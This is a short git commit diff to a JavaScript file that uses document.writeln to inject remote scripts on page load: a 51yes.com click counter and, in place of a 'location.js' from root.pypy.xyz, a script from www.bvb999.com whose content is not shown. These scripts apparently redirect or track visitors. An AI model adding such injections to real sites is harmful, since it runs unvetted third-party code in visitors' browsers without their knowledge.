fc2a24b53c783d5db00069ecc9b2e6e08c2cdc1f
opensus <jesses.king@outlook.com>
2015-07-29 11:14:11 +0800

    Update 7.js

--- j/7.js
+++ j/7.js
@@ -1,3 +1,3 @@
-document.writeln("<script language=\"javascript\" src=\"http:\/\/count22.51yes.com\/click.aspx?id=229184079&logo=12\" charset=\"gb2312\"><\/script>");
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count39.51yes.com\/click.aspx?id=394215897&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/root.pypy.xyz\/j\/location.js\"><\/script>")
+document.writeln("<script src=http:\/\/\www.bvb999.com\/5/tm.js ><\/script>");
